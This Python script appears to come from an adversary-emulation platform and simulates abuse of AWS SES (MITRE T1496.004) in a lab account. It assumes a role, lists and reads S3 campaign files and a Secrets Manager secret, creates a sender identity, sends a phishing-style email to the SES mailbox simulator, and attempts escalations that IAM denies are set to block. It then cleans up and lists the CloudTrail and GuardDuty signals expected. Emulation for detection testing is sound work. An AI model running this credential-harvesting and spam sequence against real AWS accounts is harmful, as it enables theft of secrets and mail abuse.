# FILE: attack.py
"""
ATOMIC_SES_SEND_ABUSE - Automated Attack Script
T1496.004 Cloud Service Hijacking via SES Abuse

Attack phases:
  Phase 1 - Credential Acquisition: AssumeRole to obtain attacker session
  Phase 2 - Discovery: SES posture, identity enumeration, S3 campaigns bucket, SecretsManager
  Phase 3 - Cloud Service Hijacking: Create sender identity, send spam, attempt escalation
  Phase 4 - Cleanup: Delete attacker-created email identity

Entry point: run(outputs, region)
"""
import sys
import time
import random
import json
import pathlib

# Cross-platform UTF-8 output - prevents UnicodeEncodeError on Windows CP1252 terminals
if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
if hasattr(sys.stderr, "reconfigure"):
    sys.stderr.reconfigure(encoding="utf-8", errors="replace")

import boto3
from botocore.exceptions import ClientError

# -- Resource names: single source of truth ----------------------------------
_NAMES_FILE = pathlib.Path(__file__).parent / "infra" / "resource_names.json"
if _NAMES_FILE.exists():
    _NAMES = json.loads(_NAMES_FILE.read_text(encoding="utf-8"))
else:
    _NAMES = {"resources": {}, "pulumi_export_keys": {}}
    print(f"[!] resource_names.json not found at {_NAMES_FILE} - names will fall back to outputs")

_R   = _NAMES.get("resources", {})
_PKS = _NAMES.get("pulumi_export_keys", {})


_TENANT_CREDS = {}


def _set_tenant_credentials(outputs):
    """Remember the tenant's short-lived credentials. In the MayaTrail backend the
    worker injects them as outputs['_aws_credentials']; without this the first STS
    call would run as the Celery worker identity instead of the tenant account."""
    _TENANT_CREDS.clear()
    _TENANT_CREDS.update((outputs or {}).get("_aws_credentials") or {})


def _base_session(region):
    """Session for the tenant's connected role, or the ambient default session for
    standalone runs where no credentials were injected."""
    if _TENANT_CREDS:
        return boto3.Session(
            aws_access_key_id=_TENANT_CREDS.get("AWS_ACCESS_KEY_ID"),
            aws_secret_access_key=_TENANT_CREDS.get("AWS_SECRET_ACCESS_KEY"),
            aws_session_token=_TENANT_CREDS.get("AWS_SESSION_TOKEN"),
            region_name=region,
        )
    return boto3.Session(region_name=region)


def _r(key, default=""):
    """Resolve a static resource name from resource_names.json['resources']."""
    return _R.get(key, default)


def _p(infra, key, default=""):
    """Resolve a dynamic value via pulumi_export_keys -> outputs dict -> default."""
    export_key = _PKS.get(key, key)
    return infra.get(export_key) or default


# -- Timing helpers ----------------------------------------------------------
def op_delay(min_s=2, max_s=6):
    time.sleep(random.uniform(min_s, max_s))


def phase_delay():
    time.sleep(random.uniform(5, 15))


# -- Output helpers ----------------------------------------------------------
def print_step(msg):
    print(f"\n[*] {msg}")


def print_ok(msg):
    print(f"[+] {msg}")


def print_err(msg):
    print(f"[-] {msg}")


def run(outputs: dict, region: str = "us-east-1") -> None:
    """Execute the SES Send Abuse atomic emulation (T1496.004).

    All credentials and dynamic values are read exclusively from `outputs` (Pulumi
    stack outputs dict). Static names are resolved via resource_names.json using _r().
    """
    # -- Resolve dynamic values via _p(outputs, key) -------------------------
    _set_tenant_credentials(outputs)

    attacker_role_arn = _p(outputs, "attacker_role_arn")
    campaigns_bucket  = _p(outputs, "campaigns_bucket_name")

    # -- Resolve static names via _r(key) with output fallback ---------------
    # config_set_name and victim_secret_name are known at deploy time (resource_names.json)
    # but also exported by Pulumi for runtime validation
    config_set_name       = _r("config_set_name") or _p(outputs, "config_set_name")
    victim_secret_name    = _r("victim_secret_name") or _p(outputs, "victim_secret_name")
    attacker_sender_identity = _r("email_identity") or "noreply@lab.example.com"

    if not attacker_role_arn:
        raise RuntimeError(
            "Missing required Pulumi output: 'attacker_role_arn'. "
            "Ensure the infra stack is deployed and exports this key."
        )
    if not campaigns_bucket:
        raise RuntimeError(
            "Missing required Pulumi output: 'campaigns_bucket_name'. "
            "Ensure the infra stack is deployed and exports this key."
        )
    if not victim_secret_name:
        raise RuntimeError(
            "Missing required resource name: 'victim_secret_name'. "
            "Check resource_names.json['resources']['victim_secret_name']."
        )
    if not config_set_name:
        raise RuntimeError(
            "Missing required resource name: 'config_set_name'. "
            "Check resource_names.json['resources']['config_set_name']."
        )

    # IAM ForAllValues:StringLike condition restricts every send to this address only
    mailbox_simulator_addr = "success@simulator.amazonses.com"

    # ==========================================================================
    # Phase 1 - Credential Acquisition
    # T1496.004: Assume the seeded victim IAM role using pipeline execution identity
    # CloudTrail: sts:AssumeRole
    # ==========================================================================
    print_step("Phase 1 - Credential Acquisition: AssumeRole into attacker role")
    print_step("Step 1/10 [T1496.004] AssumeRole - obtain short-lived attacker session")

    sts_pipeline = _base_session(region).client("sts")
    try:
        assume_resp = sts_pipeline.assume_role(
            RoleArn=attacker_role_arn,
            RoleSessionName="ses-abuse-emulation",
            DurationSeconds=3600,
        )
    except ClientError as e:
        raise RuntimeError(f"AssumeRole failed: {e}")

    creds = assume_resp["Credentials"]
    attacker_session = boto3.Session(
        aws_access_key_id=creds["AccessKeyId"],
        aws_secret_access_key=creds["SecretAccessKey"],
        aws_session_token=creds["SessionToken"],
        region_name=region,
    )
    print_ok(
        f"Attacker session acquired: role={attacker_role_arn} "
        f"key={creds['AccessKeyId'][:12]}..."
    )

    op_delay(2, 4)
    phase_delay()

    # Build all attacker-session clients before the try/finally so the finally
    # cleanup block can always reach them regardless of where a failure occurs.
    sesv2_client = attacker_session.client("sesv2",          region_name=region)
    ses_client   = attacker_session.client("ses",            region_name=region)
    s3_client    = attacker_session.client("s3",             region_name=region)
    sm_client    = attacker_session.client("secretsmanager", region_name=region)

    # State flags tracked for the finally block so every mutation is reverted
    # even if an inline revert raises a non-ClientError exception mid-run.
    identity_created     = False  # CreateEmailIdentity succeeded
    prod_access_escalated = False  # PutAccountDetails somehow succeeded despite deny-guard
    sending_escalated    = False  # UpdateAccountSendingEnabled somehow succeeded despite deny-guard

    try:
        # ======================================================================
        # Phase 2 - Discovery
        # T1496.004: Enumerate SES posture, identities, campaign infrastructure,
        #            and credential store before staging the abuse campaign
        # ======================================================================
        print_step("Phase 2 - Discovery: SES account posture and campaign infrastructure")

        # Step 2: Enumerate SES account sending limits and production-access status
        # CloudTrail: ses:GetAccount (sesv2), ses:GetSendQuota (ses v1)
        print_step(
            "Step 2/10 [T1496.004] GetAccount + GetSendQuota - "
            "enumerate SES posture before staging abuse campaign"
        )
        try:
            acct_resp       = sesv2_client.get_account()
            sending_enabled = acct_resp.get("SendingEnabled", False)
            prod_access     = acct_resp.get("ProductionAccessEnabled", False)
            enforcement     = acct_resp.get("EnforcementStatus", "UNKNOWN")
            print_ok(
                f"SES account: sending_enabled={sending_enabled}, "
                f"production_access={prod_access}, enforcement={enforcement}"
            )
        except ClientError as e:
            print_err(f"sesv2 get_account: {e}")

        op_delay(1, 2)

        try:
            quota_resp = ses_client.get_send_quota()
            max_24h    = quota_resp.get("Max24HourSend", 0)
            sent_last  = quota_resp.get("SentLast24Hours", 0)
            max_rate   = quota_resp.get("MaxSendRate", 0)
            print_ok(
                f"SES quota: max_24h={max_24h}, "
                f"sent_last_24h={sent_last}, max_rate={max_rate} msg/s"
            )
        except ClientError as e:
            print_err(f"ses get_send_quota: {e}")

        op_delay(2, 5)

        # Step 3: List existing SES email identities
        # Real attacker discovers registered sender addresses available for hijacking
        # CloudTrail: ses:ListIdentities
        print_step(
            "Step 3/10 [T1496.004] ListIdentities - "
            "discover registered sender addresses available for hijacking"
        )
        try:
            idents_resp = ses_client.list_identities(
                IdentityType="EmailAddress",
                MaxItems=100,
            )
            identities = idents_resp.get("Identities", [])
            print_ok(f"Discovered {len(identities)} SES email identity(ies)")
            for ident in identities:
                print(f"      Identity: {ident}")
        except ClientError as e:
            print_err(f"ses list_identities: {e}")

        op_delay(2, 4)

        # Step 4: Discover campaign bucket and exfiltrate HTML template + recipient CSV
        # CLIENT-ACCOUNT SAFETY: only operate on the lab-exported bucket name;
        # never take the first item from list_buckets response.
        # CloudTrail: s3:ListBuckets (management event)
        # Data-plane events (S3 server-access logs): ListObjectsV2, GetObject
        print_step(
            "Step 4/10 [T1496.004] ListBuckets + ListObjectsV2 + GetObject - "
            "discover campaigns bucket and exfiltrate template/recipient list"
        )
        try:
            buckets_resp = s3_client.list_buckets()
            all_buckets  = [b["Name"] for b in buckets_resp.get("Buckets", [])]
            print_ok(f"Discovered {len(all_buckets)} S3 bucket(s) in account")
            if campaigns_bucket in all_buckets:
                print_ok(f"Target campaigns bucket confirmed: {campaigns_bucket}")
            else:
                print_err(
                    f"Campaigns bucket '{campaigns_bucket}' absent from ListBuckets "
                    "(may be cross-region or access-restricted) - continuing"
                )
        except ClientError as e:
            print_err(f"s3 list_buckets: {e}")

        op_delay(1, 2)

        try:
            obj_resp = s3_client.list_objects_v2(Bucket=campaigns_bucket)
            objects  = obj_resp.get("Contents", [])
            print_ok(f"Listed {len(objects)} object(s) in '{campaigns_bucket}':")
            for obj in objects:
                print(f"      Key: {obj['Key']}  Size: {obj['Size']} bytes")
        except ClientError as e:
            print_err(f"s3 list_objects_v2 '{campaigns_bucket}': {e}")

        op_delay(1, 2)

        try:
            tmpl_resp    = s3_client.get_object(Bucket=campaigns_bucket, Key="template.html")
            tmpl_content = tmpl_resp["Body"].read()
            print_ok(
                f"GetObject template.html: {len(tmpl_content)} bytes retrieved "
                "(staging spam payload)"
            )
        except ClientError as e:
            print_err(f"s3 get_object template.html: {e}")

        op_delay(1, 2)

        try:
            rcpt_resp    = s3_client.get_object(Bucket=campaigns_bucket, Key="recipients.csv")
            rcpt_content = rcpt_resp["Body"].read()
            print_ok(
                f"GetObject recipients.csv: {len(rcpt_content)} bytes retrieved "
                "(harvesting recipient list)"
            )
        except ClientError as e:
            print_err(f"s3 get_object recipients.csv: {e}")

        op_delay(2, 5)

        # Step 5: Enumerate SecretsManager for prod SES sending credentials
        # Real attacker harvests long-term credentials stored in secrets during discovery
        # CloudTrail: secretsmanager:ListSecrets, secretsmanager:GetSecretValue
        # GuardDuty: CredentialAccess:SecretsManagerSecret
        print_step(
            "Step 5/10 [T1496.004] ListSecrets + GetSecretValue - "
            "enumerate SecretsManager for SES sending credentials"
        )
        try:
            secrets_resp = sm_client.list_secrets()
            secrets      = secrets_resp.get("SecretList", [])
            print_ok(f"Discovered {len(secrets)} secret(s) in SecretsManager")
            for sec in secrets:
                print(f"      Secret: {sec.get('Name')}  ARN: ...{sec.get('ARN', '')[-20:]}")
        except ClientError as e:
            print_err(f"secretsmanager list_secrets: {e}")

        op_delay(1, 2)

        # CLIENT-ACCOUNT SAFETY: only read the lab-exported secret name
        try:
            secret_resp  = sm_client.get_secret_value(SecretId=victim_secret_name)
            secret_value = secret_resp.get("SecretString", "")
            print_ok(
                f"GetSecretValue '{victim_secret_name}': "
                f"{len(secret_value)} chars retrieved"
            )
        except ClientError as e:
            print_err(f"secretsmanager get_secret_value '{victim_secret_name}': {e}")

        op_delay(2, 5)
        phase_delay()

        # ======================================================================
        # Phase 3 - Cloud Service Hijacking: SES Abuse Campaign
        # T1496.004: Register attacker sender, send spam, attempt limit escalation
        # ======================================================================
        print_step("Phase 3 - Cloud Service Hijacking: SES abuse campaign")

        # Step 6: Create attacker-controlled sender identity
        # example.com is IANA-reserved - can never pass DNS verification (2nd safety layer)
        # CloudTrail: ses:CreateEmailIdentity
        print_step(
            f"Step 6/10 [T1496.004] CreateEmailIdentity - "
            f"register '{attacker_sender_identity}' as spam sender"
        )
        try:
            sesv2_client.create_email_identity(
                EmailIdentity=attacker_sender_identity,
                Tags=[{"Key": "campaign", "Value": "marketing-blast"}],
            )
            identity_created = True
            print_ok(
                f"[OK] Email identity created: {attacker_sender_identity} "
                "(state: PENDING_VERIFICATION - example.com DNS is not controllable)"
            )
        except ClientError as e:
            code = e.response["Error"]["Code"]
            if code == "AlreadyExistsException":
                print_ok(
                    f"Identity '{attacker_sender_identity}' already exists "
                    "(prior run) - continuing"
                )
                identity_created = True
            else:
                raise RuntimeError(f"create_email_identity failed: {e}")

        op_delay(3, 6)

        # Step 7: Send spam from attacker identity to AWS mailbox simulator
        # IAM ForAllValues:StringLike condition blocks any non-simulator recipient.
        # Unverified example.com identity causes SES to return MessageRejected.
        # Both are expected outcomes - catch and log, do NOT abort.
        # SES data-plane event - no CloudTrail management event emitted.
        # Detection via SES CloudWatch event destination configured on the config set.
        print_step(
            f"Step 7/10 [T1496.004] SendEmail - "
            f"spam blast from '{attacker_sender_identity}' to mailbox simulator "
            f"(expects MessageRejected - unverified sender)"
        )
        try:
            send_resp = sesv2_client.send_email(
                FromEmailAddress=attacker_sender_identity,
                Destination={"ToAddresses": [mailbox_simulator_addr]},
                Content={
                    "Simple": {
                        "Subject": {"Data": "Important account update - action required"},
                        "Body": {
                            "Html": {
                                "Data": (
                                    "<html><body>"
                                    "<p>Click here to verify your account "
                                    "and claim your reward.</p>"
                                    "</body></html>"
                                )
                            }
                        },
                    }
                },
                ConfigurationSetName=config_set_name,
            )
            msg_id = send_resp.get("MessageId", "UNKNOWN")
            print_ok(
                f"SendEmail succeeded (unexpected) - MessageId: {msg_id} "
                "(delivered to mailbox simulator only - no human recipient impact)"
            )
        except ClientError as e:
            code = e.response["Error"]["Code"]
            if code == "MessageRejected":
                print_ok(
                    "[OK] SendEmail returned MessageRejected as expected "
                    "(unverified sender identity - SES safety layer active)"
                )
            elif code in ("AccessDenied", "AccessDeniedException"):
                print_ok(
                    "[OK] SendEmail returned AccessDenied "
                    "(IAM recipient condition blocked non-simulator address)"
                )
            else:
                print_err(f"SendEmail unexpected error ({code}): {e}")

        op_delay(3, 6)

        # Step 8: Attempt PutAccountDetails to request SES production access
        # DENY-GUARDED: attacker role carries an explicit IAM Deny on ses:PutAccountDetails.
        # AWS guarantees AccessDenied; CloudTrail records the attempt + errorCode.
        # If it somehow succeeds the deny guard is broken - set flag, revert inline,
        # and the finally block will retry the revert if the inline attempt fails.
        print_step(
            "Step 8/10 [T1496.004] PutAccountDetails - "
            "attempt production-access escalation (IAM deny-guarded; expects AccessDenied)"
        )
        try:
            sesv2_client.put_account_details(
                MailType="MARKETING",
                WebsiteURL="https://lab.example.com",
                UseCaseDescription="Bulk marketing campaigns for registered users",
                ProductionAccessEnabled=True,
            )
            # Deny guard failed - mark escalated so finally block can also revert
            prod_access_escalated = True
            print_err(
                "SAFETY VIOLATION: PutAccountDetails succeeded - "
                "IAM deny guard did not fire; reverting inline"
            )
            try:
                sesv2_client.put_account_details(
                    MailType="MARKETING",
                    WebsiteURL="https://lab.example.com",
                    UseCaseDescription="Bulk marketing campaigns for registered users",
                    ProductionAccessEnabled=False,
                )
                prod_access_escalated = False
                print_ok("Inline revert: ProductionAccessEnabled set back to False")
            except ClientError as revert_e:
                print_err(
                    f"Inline revert PutAccountDetails failed: {revert_e} "
                    "- finally block will retry"
                )
            raise RuntimeError(
                "PutAccountDetails IAM deny guard failed - production access was "
                "enabled; verify deny statement on attacker role policy"
            )
        except ClientError as e:
            code = e.response["Error"]["Code"]
            if code in ("AccessDenied", "AccessDeniedException"):
                print_ok(
                    "[OK] PutAccountDetails returned AccessDenied as expected "
                    "(IAM deny-guard active - escalation attempt recorded in CloudTrail)"
                )
            else:
                print_err(f"PutAccountDetails unexpected error ({code}): {e}")

        op_delay(2, 5)

        # Step 9: Attempt UpdateAccountSendingEnabled - second escalation vector
        # DENY-GUARDED: same explicit IAM Deny; expects AccessDenied.
        # If it somehow succeeds, set flag, disable inline, and finally block retries.
        print_step(
            "Step 9/10 [T1496.004] UpdateAccountSendingEnabled - "
            "attempt account-wide sending escalation (IAM deny-guarded; expects AccessDenied)"
        )
        try:
            ses_client.update_account_sending_enabled(Enabled=True)
            # Deny guard failed - mark escalated so finally block can also revert
            sending_escalated = True
            print_err(
                "SAFETY VIOLATION: UpdateAccountSendingEnabled succeeded - "
                "IAM deny guard did not fire; reverting inline"
            )
            try:
                ses_client.update_account_sending_enabled(Enabled=False)
                sending_escalated = False
                print_ok("Inline revert: account-wide sending disabled")
            except ClientError as revert_e:
                print_err(
                    f"Inline revert UpdateAccountSendingEnabled failed: {revert_e} "
                    "- finally block will retry"
                )
            raise RuntimeError(
                "UpdateAccountSendingEnabled IAM deny guard failed - account-wide "
                "sending was enabled; verify deny statement on attacker role policy"
            )
        except ClientError as e:
            code = e.response["Error"]["Code"]
            if code in ("AccessDenied", "AccessDeniedException"):
                print_ok(
                    "[OK] UpdateAccountSendingEnabled returned AccessDenied as expected "
                    "(IAM deny-guard active - escalation attempt recorded in CloudTrail)"
                )
            else:
                print_err(f"UpdateAccountSendingEnabled unexpected error ({code}): {e}")

        op_delay(2, 5)
        phase_delay()

    finally:
        # ======================================================================
        # Phase 4 - Cleanup
        # try/finally guarantees this block runs even if an earlier phase raises.
        # All reverts for deny-guarded escalation steps run here as a safety net
        # in case inline reverts above raised non-ClientError exceptions mid-run.
        # ======================================================================
        print_step("Phase 4 - Cleanup")

        # Revert production-access escalation if inline revert failed or was skipped
        if prod_access_escalated:
            print_step(
                "Safety revert: PutAccountDetails ProductionAccessEnabled=False "
                "(inline revert did not complete)"
            )
            try:
                sesv2_client.put_account_details(
                    MailType="MARKETING",
                    WebsiteURL="https://lab.example.com",
                    UseCaseDescription="Bulk marketing campaigns for registered users",
                    ProductionAccessEnabled=False,
                )
                print_ok("[OK] ProductionAccessEnabled reverted to False")
            except ClientError as e:
                print_err(f"Safety revert PutAccountDetails failed: {e}")

        # Revert account-wide sending escalation if inline revert failed or was skipped
        if sending_escalated:
            print_step(
                "Safety revert: UpdateAccountSendingEnabled Enabled=False "
                "(inline revert did not complete)"
            )
            try:
                ses_client.update_account_sending_enabled(Enabled=False)
                print_ok("[OK] Account-wide sending reverted to disabled")
            except ClientError as e:
                print_err(f"Safety revert UpdateAccountSendingEnabled failed: {e}")

        # Step 10: Delete attacker-created SES email identity
        # Deletion event is itself a defense-evasion IOC in CloudTrail (T1070)
        # CloudTrail: ses:DeleteEmailIdentity
        if identity_created:
            print_step(
                f"Step 10/10 [T1496.004] DeleteEmailIdentity - "
                f"remove '{attacker_sender_identity}' post-campaign (defense evasion IOC)"
            )
            try:
                sesv2_client.delete_email_identity(EmailIdentity=attacker_sender_identity)
                print_ok(
                    f"[OK] Email identity '{attacker_sender_identity}' deleted - "
                    "CloudTrail records deletion as defense evasion indicator"
                )
            except ClientError as e:
                code = e.response["Error"]["Code"]
                if code == "NotFoundException":
                    print_ok(
                        f"Identity '{attacker_sender_identity}' already absent - "
                        "cleanup complete"
                    )
                else:
                    print_err(f"delete_email_identity: {e}")

            op_delay(2, 4)
        else:
            print_ok("No attacker identity was created - nothing to clean up")

    # -- Attack summary -------------------------------------------------------
    print("\n" + "=" * 64)
    print("[SUMMARY] ATOMIC_SES_SEND_ABUSE - Complete")
    print("=" * 64)
    print("  Technique : T1496.004 - Cloud Service Hijacking (SES Abuse)")
    print(f"  Role      : {attacker_role_arn}")
    print(f"  Sender    : {attacker_sender_identity}")
    print(f"  Recipient : {mailbox_simulator_addr} (mailbox simulator only)")
    print(f"  Bucket    : {campaigns_bucket}")
    print(f"  Secret    : {victim_secret_name}")
    print(f"  Config set: {config_set_name}")
    print("")
    print("  CloudTrail management events generated:")
    print("    sts:AssumeRole                                  Phase 1  Step 1")
    print("    ses:GetAccount (sesv2)                          Phase 2  Step 2")
    print("    ses:GetSendQuota                                Phase 2  Step 2")
    print("    ses:ListIdentities                              Phase 2  Step 3")
    print("    s3:ListBuckets                                  Phase 2  Step 4")
    print("    secretsmanager:ListSecrets                      Phase 2  Step 5")
    print("    secretsmanager:GetSecretValue                   Phase 2  Step 5")
    print("    ses:CreateEmailIdentity                         Phase 3  Step 6")
    print("    ses:PutAccountDetails (AccessDenied)            Phase 3  Step 8")
    print("    ses:UpdateAccountSendingEnabled (AccessDenied)  Phase 3  Step 9")
    print("    ses:DeleteEmailIdentity                         Phase 4  Step 10")
    print("")
    print("  Data-plane / event-destination events (no CloudTrail mgmt event):")
    print("    s3:ListObjectsV2   campaigns bucket             Phase 2  Step 4")
    print("    s3:GetObject       template.html                Phase 2  Step 4")
    print("    s3:GetObject       recipients.csv               Phase 2  Step 4")
    print("    ses:SendEmail (MessageRejected expected)         Phase 3  Step 7")
    print("      -> detection via SES CloudWatch event destination on config set")
    print("")
    print("  GuardDuty findings expected:")
    print("    CredentialAccess:SecretsManagerSecret           Phase 2  Step 5")
    print("=" * 64)
